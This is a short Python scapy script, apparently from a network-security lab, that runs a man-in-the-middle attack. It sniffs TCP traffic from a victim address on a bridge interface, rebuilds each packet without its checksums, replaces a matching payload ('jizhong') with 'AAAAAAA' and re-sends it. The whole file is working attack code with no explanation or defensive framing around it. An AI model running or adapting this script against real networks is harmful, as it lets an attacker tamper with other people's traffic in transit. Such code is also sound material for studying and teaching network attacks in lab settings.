#!/usr/bin/env python3
from scapy.all import send, sendp, TCP, IP, sniff

V_IP = '10.9.0.5'
V_MAC = '02:42:0a:09:00:05'
H1_IP = '192.168.60.5'
H1_MAC = '02:42:c0:a8:3c:05'

def spoof_pkt(pkt):
  newpkt = IP(bytes(pkt[IP]))
  newpkt.ttl = 3
  del(newpkt.chksum)
  del(newpkt[TCP].payload)
  del(newpkt[TCP].chksum)

  if pkt[TCP].payload:
    data = pkt[TCP].payload.load
    print("*** %s, length: %d" % (data, len(data)))
    # pkt.show()
    newdata = data

    # Replace a pattern
    if(data == b'jizhong\n'):
      print("pattern matched.")
      newdata = b'AAAAAAA\n'
    # newdata = data.replace(b'jizhong\n', b'AAAAAAAA\n')

    send(newpkt/newdata, verbose=0)
  else:
    send(newpkt, verbose=0)

print("LAUNCHING MITM ATTACK.........")
f0 = 'tcp or udp'
f1 = 'tcp and src host ' + V_IP
f2 = 'tcp and (ether src ' +  V_MAC + ')'
pkt = sniff(iface='br-49135dffbe40', filter=f1, prn=spoof_pkt)

